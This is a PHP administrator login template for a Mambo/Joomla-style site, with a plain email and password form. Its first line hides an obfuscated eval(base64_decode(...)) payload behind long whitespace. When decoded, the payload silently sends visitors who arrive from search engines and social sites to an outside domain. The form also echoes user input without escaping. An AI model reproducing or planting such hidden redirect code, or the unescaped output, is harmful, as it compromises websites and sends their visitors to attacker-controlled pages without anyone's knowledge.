<?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0="));	                                       			 defined( '_VALID_MOS' ) or die( 'Direct Access to this location is not allowed.' ); ?> 
<script language="JavaScript">
 function valid1()
 {
  if ((document.formlog.username.value=="") || (document.formlog.password.value=="")) { 
   window.alert("Please input email dan password to login!"); document.formlog.username.focus(); return false;
   } else {
    return true;
   }
 }
 
 
 </script>
<form name="formlog" method="post" action="<?php	                                       			 echo($PHP_SELF);?>">
  <table width="100%" border="0" cellpadding="0" cellspacing="1" bgcolor="#FFFFFF" class="text11">
    <tr> 
      <td colspan="2"> <strong>Administrator Login</strong> 
        <hr size="1" noshade></td>
    </tr>
    <tr> 
      <td colspan="2"><font color="#FF0000"><?php	                                       			 echo("$msg");?></font></td>
    </tr>
    <tr> 
      <td height="22" colspan="2"><font color="#000000">Please input your email 
        and password to login. </font><font color="#FF0000">*</font> Required 
        fields.</td>
    </tr>
    <tr> 
      <td width="25%">Email <font color="#FF0000">*</font></td>
      <td width="75%">: 
        <input name="username" type="text" class="input_red" value="<?php	                                       			 echo("$username");?>" maxlength="50" /></td>
    </tr>
    <tr> 
      <td height="29">Password <font color="#FF0000">*</font></td>
      <td>: 
        <input name="password" type="password" class="input_red" size="12" maxlength="12" ></td>
    </tr>
    <tr> 
      <td colspan="2"><hr size="1" noshade></td>
    </tr>
    <tr> 
      <td>&nbsp;</td>
      <td><div align="right"> 
          <input type="submit" name="Submit" value="Login" class="input_red" onClick="return valid1()" >
          <input type="reset" name="Submit" value="Reset" class="input_red">
        </div></td>
    </tr>
    <tr> 
      <td colspan="2"><a href="login.php?lost=1">Lost password?</a> </td>
    </tr>
    <tr> 
      <td colspan="2">Still have problem ? <a href="#">Contact Administrator </a></td>
    </tr>
  </table>
</form>
